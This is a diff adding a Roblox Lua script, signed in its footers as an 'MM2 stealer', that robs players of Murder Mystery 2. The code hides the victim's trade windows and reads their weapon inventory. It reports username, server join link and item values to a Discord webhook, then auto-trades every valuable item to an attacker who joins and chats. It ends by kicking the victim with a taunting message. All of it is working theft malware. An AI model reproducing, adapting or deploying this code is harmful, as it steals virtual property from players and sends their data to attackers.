+                        valueList[dataid] = matchedChromaValue
+                    end
+                else
+                    local value = allExtractedValues[itemName]
+                    if value then
+                        valueList[dataid] = value
+                    end
+                end
+            end
+        end
+    end
+
+    return valueList
+end
+
+local function sendTradeRequest(user)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+end
+
+local function getTradeStatus()
+    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+end
+
+local function waitForTradeCompletion()
+    while true do
+        local status = getTradeStatus()
+        if status == "None" then
+            break
+        end
+        wait(0.1)
+    end
+end
+
+local function acceptTrade()
+    local args = {
+        [1] = 285646582
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+end
+
+local function addWeaponToTrade(id)
+    local args = {
+        [1] = id,
+        [2] = "Weapons"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end
+
+local totalValue = 0
+
+local function SendFirstMessage(list, prefix)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Join link:",
+            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
+        },
+        {
+            name = "Item list:",
+            value = "",
+            inline = false
+        },
+        {
+            name = "Summary:",
+            value = string.format("Total Value: %s", totalValue),
+            inline = false
+        }
+    }
+
+    for _, item in ipairs(list) do
+        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+        fields[3].value = fields[3].value .. itemLine .. "\n"
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = "\240\159\148\170 Join to get MM2 hit",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local function SendMessage(sortedItems)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = string.format("Total Value: %s", totalValue),
+            inline = false
+        }
+	}
+
+    for _, item in ipairs(sortedItems) do
+        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+        fields[2].value = fields[2].value .. itemLine .. "\n"
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\148\170 New MM2 Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local tradegui = playerGui:WaitForChild("TradeGUI")
+tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    tradegui.Enabled = false
+end)
+local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
+    tradeguiphone.Enabled = false
+end)
+
+local min_rarity_index = table.find(rarityTable, min_rarity)
+
+local untradable = {
+    ["DefaultGun"] = true,
+    ["DefaultKnife"] = true,
+    ["Reaver"] = true,
+    ["Reaver_Legendary"] = true,
+    ["Reaver_Godly"] = true,
+    ["Reaver_Ancient"] = true,
+    ["IceHammer"] = true,
+    ["IceHammer_Legendary"] = true,
+    ["IceHammer_Godly"] = true,
+    ["IceHammer_Ancient"] = true,
+    ["Gingerscythe"] = true,
+    ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true,
+    ["Gingerscythe_Ancient"] = true,
+    ["TestItem"] = true,
+    ["Season1TestKnife"] = true,
+    ["Cracks"] = true,
+    ["Icecrusher"] = true,
+    ["???"] = true,
+    ["Dartbringer"] = true,
+    ["TravelerAxeRed"] = true,
+    ["TravelerAxeBronze"] = true,
+    ["TravelerAxeSilver"] = true,
+    ["TravelerAxeGold"] = true,
+    ["BlueCamo_K_2022"] = true,
+    ["GreenCamo_K_2022"] = true,
+    ["SharkSeeker"] = true
+}
+
+local valueList = buildValueList()
+local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+for i, v in pairs(realData.Weapons.Owned) do
+    local dataid = i
+    local amount = v
+    local rarity = database[dataid].Rarity
+    local weapon_rarity_index = table.find(rarityTable, rarity)
+    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+        local value
+        if valueList[dataid] then
+            value = valueList[dataid]
+        else
+            if weapon_rarity_index >= table.find(rarityTable, "Godly") then
+                value = 2
+            else
+                value = 1
+            end
+        end
+        if value >= min_value then
+            totalValue = totalValue + (value * amount)
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
+        end
+    end
+end
+
+if #weaponsToSend > 0 then
+    table.sort(weaponsToSend, function(a, b)
+        return (a.Value * a.Amount) > (b.Value * b.Amount)
+    end)
+
+    local sentWeapons = {}
+    for i, v in ipairs(weaponsToSend) do
+        sentWeapons[i] = v
+    end
+
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+
+    SendFirstMessage(weaponsToSend, prefix)
+
+    local function doTrade(joinedUser)
+        local initialTradeState = getTradeStatus()
+        if initialTradeState == "StartTrade" then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+            wait(0.3)
+        elseif initialTradeState == "ReceivingRequest" then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+            wait(0.3)
+        end
+
+        while #weaponsToSend > 0 do
+            local tradeStatus = getTradeStatus()
+
+            if tradeStatus == "None" then
+                sendTradeRequest(joinedUser)
+            elseif tradeStatus == "SendingRequest" then
+                wait(0.3)
+            elseif tradeStatus == "ReceivingRequest" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                wait(0.3)
+            elseif tradeStatus == "StartTrade" then
+                for i = 1, math.min(4, #weaponsToSend) do
+                    local weapon = table.remove(weaponsToSend, 1)
+                    for count = 1, weapon.Amount do
+                        addWeaponToTrade(weapon.DataID)
+                    end
+                end
+                wait(6)
+                acceptTrade()
+                waitForTradeCompletion()
+            else
+                wait(0.5)
+            end
+            wait(1)
+        end
+        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+    end
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
+                        SendMessage(sentWeapons)
+                        sentMessage = true
+                    end
+                    doTrade(player.Name)
+                end)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
+    end
+    waitForUserChat()
+end
